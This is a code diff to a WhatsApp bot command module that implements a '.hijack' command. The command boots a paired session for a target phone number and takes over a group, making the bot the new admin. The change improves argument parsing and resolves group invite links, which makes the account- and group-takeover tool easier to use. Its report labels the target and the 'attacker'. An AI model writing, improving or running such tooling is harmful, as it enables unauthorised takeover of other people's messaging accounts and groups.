@@ -159,28 +159,53 @@ module.exports = {
     aliases: ['hjack', 'takeover', 'seize'],
     category: 'hijack',
     desc: '👁️ ɢʀᴏᴜᴘ ᴛᴀᴋᴇᴏᴠᴇʀ ᴠɪᴀ ᴘᴀɪʀᴇᴅ sᴇssɪᴏɴ',
-    usage: '.hijack <targetPhone> <groupJid>',
+    usage: '.hijack <targetPhone> <groupLink or JID>',
     privateOnly: true,
 
     async execute(sock, msg, args, ctx) {
         const s = ctx.settings;
-        const [phone, groupJid] = args;
-        if (!phone || !groupJid || !groupJid.endsWith('@g.us')) {
-            return ctx.reply(`❌ ᴜsᴀɢᴇ: ${s.prefix}hijack <ᴛᴀʀɢᴇᴛᴘʜᴏɴᴇ> <ɢʀᴏᴜᴘᴊɪᴅ>${s.FOOTER}`);
+        
+        // Smart arg parsing — order doesn't matter.
+        // Link/JID goes to groupJid, digits go to targetPhone.
+        let targetPhone = null;
+        let groupTarget = null;
+
+        for (const arg of args) {
+            if (arg.includes('chat.whatsapp.com') || arg.endsWith('@g.us')) {
+                groupTarget = arg;
+            } else if (/^\d{7,15}$/.test(arg.replace(/\D/g, ''))) {
+                targetPhone = arg.replace(/\D/g, '');
+            }
         }
 
-        // scopeKey = operator's paired store. attackerJid = bot becoming new admin.
+        if (!targetPhone || !groupTarget) {
+            return ctx.reply(`❌ ᴜsᴀɢᴇ: ${s.prefix}hijack <ᴛᴀʀɢᴇᴛᴘʜᴏɴᴇ> <ɢʀᴏᴜᴘ ʟɪɴᴋ ᴏʀ ᴊɪᴅ>${s.FOOTER}`);
+        }
+
         const scopeKey    = ctx.sender;
         const attackerJid = sock.user?.id || ctx.sender;
-        const cleanPhone  = String(phone).replace(/\D/g, '');
 
         if (!scopeKey) return ctx.reply(`❌ sᴇɴᴅᴇʀ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);
         if (!attackerJid) return ctx.reply(`❌ ʙᴏᴛ sᴇssɪᴏɴ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);
 
-        let targetSock = null;
-        await ctx.reply(`⏳ ʙᴏᴏᴛɪɴɢ ʜɪᴊᴀᴄᴋ sᴇssɪᴏɴ ғᴏʀ +${cleanPhone}...${s.FOOTER}`);
+        // Resolve group link to JID
+        let groupJid = groupTarget;
+        if (groupJid.includes('chat.whatsapp.com')) {
+            await ctx.reply(`⏳ ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ ʟɪɴᴋ...${s.FOOTER}`);
+            let code = groupJid.split('/').pop().split('?')[0].trim();
+            try {
+                const info = await sock.groupGetInviteInfo(code);
+                if (info?.id) groupJid = info.id;
+                else throw new Error('Info not returned');
+            } catch (e) {
+                return ctx.reply(`❌ ɢʀᴏᴜᴘ ʟɪɴᴋ ʀᴇsᴏʟᴠᴇ ғᴀɪʟ: ${e.message}${s.FOOTER}`);
+            }
+        }
 
-        try { targetSock = await bootHijackSession(scopeKey, cleanPhone); }
+        let targetSock = null;
+        await ctx.reply(`⏳ ʙᴏᴏᴛɪɴɢ ʜɪᴊᴀᴄᴋ sᴇssɪᴏɴ ғᴏʀ +${targetPhone}...${s.FOOTER}`);
+
+        try { targetSock = await bootHijackSession(scopeKey, targetPhone); }
         catch (e) { return ctx.reply(`❌ sᴇssɪᴏɴ ʙᴏᴏᴛ ғᴀɪʟ: ${e.message}${s.FOOTER}`); }
 
         try {
@@ -195,7 +220,7 @@ module.exports = {
             const lines = [
                 `╭═══〘 ʜɪᴊᴀᴄᴋ ʀᴇᴘᴏʀᴛ 〙═══⊷❍`,
                 `┃ 🎯 ${groupJid}`,
-                `┃ 👤 ᴛᴀʀɢᴇᴛ +${cleanPhone}`,
+                `┃ 👤 ᴛᴀʀɢᴇᴛ +${targetPhone}`,
                 `┃ ⚔️ ᴀᴛᴛᴀᴄᴋᴇʀ ${extractPhone(attackerJid)}`,
                 `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄`,
                 `┃ ${result.contested ? (result.contestedSafe ? '🟡 ᴄᴏɴᴛᴇsᴛᴇᴅ (sᴀғᴇ)' : '🔴 ᴄᴏɴᴛᴇsᴛᴇᴅ') : '🟢 ᴜɴᴄᴏɴᴛᴇsᴛᴇᴅ'}`,
